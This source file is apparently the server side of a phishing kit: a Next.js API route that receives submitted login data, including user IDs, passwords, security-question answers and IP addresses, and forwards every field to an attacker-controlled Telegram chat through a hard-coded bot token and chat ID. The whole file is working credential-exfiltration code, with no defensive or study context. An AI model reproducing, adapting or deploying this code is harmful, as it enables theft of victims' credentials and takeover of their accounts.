// pages/api/submit-login.js

import fetch from 'node-fetch';

export default async function handler(req, res) {
    // 1. Pastikan Request adalah POST
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    // 2. Ambil Data dari Body Request
    // Data ini berisi userID, password, answer1, answer2, ip, dll.
    const data = req.body; 

    // 3. Konfigurasi Telegram Bot
    const TELEGRAM_BOT_TOKEN = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";
    const CHAT_ID = "6604182176";

    // 4. Buat Pesan
    let messageText = '🚨 NEW LOGIN DATA RECEIVED 🚨\n\n';
    
    // Looping untuk menambahkan semua data yang dikirim dari client
    for (const key in data) {
        messageText += `*${key.toUpperCase()}*: ${data[key]}\n`;
    }

    // 5. Kirim ke Telegram
    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        await fetch(telegramURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown' // Menggunakan Markdown untuk format
            }),
        });

        // 6. Respon ke Klien (Sama seperti PHP sebelumnya)
        return res.status(200).json({ status: 'success', message: 'Data successfully processed' });
        
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return res.status(500).json({ status: 'error', message: 'Internal Server Error' });
    }
}
